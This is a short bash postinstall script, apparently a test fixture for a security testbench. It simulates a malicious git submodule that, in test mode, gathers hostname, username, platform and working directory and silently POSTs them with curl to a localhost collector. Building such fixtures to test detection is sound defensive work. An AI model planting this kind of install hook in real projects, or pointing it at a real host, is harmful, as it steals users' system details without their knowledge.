#!/bin/bash

# MALICIOUS SUBMODULE POSTINSTALL SCRIPT
# This executes when the submodule is initialized or updated

if [ "$TESTBENCH_MODE" = "enabled" ]; then
    echo "[MALICIOUS SUBMODULE] Executing postinstall script..."
    
    # Collect system information
    DATA=$(cat <<EOF
{
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "package": "malicious-submodule",
  "attackType": "git-submodule",
  "hostname": "$(hostname)",
  "username": "$(whoami)",
  "platform": "$(uname -s)",
  "cwd": "$(pwd)"
}
EOF
)
    
    # Exfiltrate data (localhost only in testbench)
    echo "$DATA" | curl -s -X POST http://localhost:3000/collect \
        -H "Content-Type: application/json" \
        -d @- > /dev/null 2>&1 || true
    
    echo "[MALICIOUS SUBMODULE] Data exfiltration completed"
fi

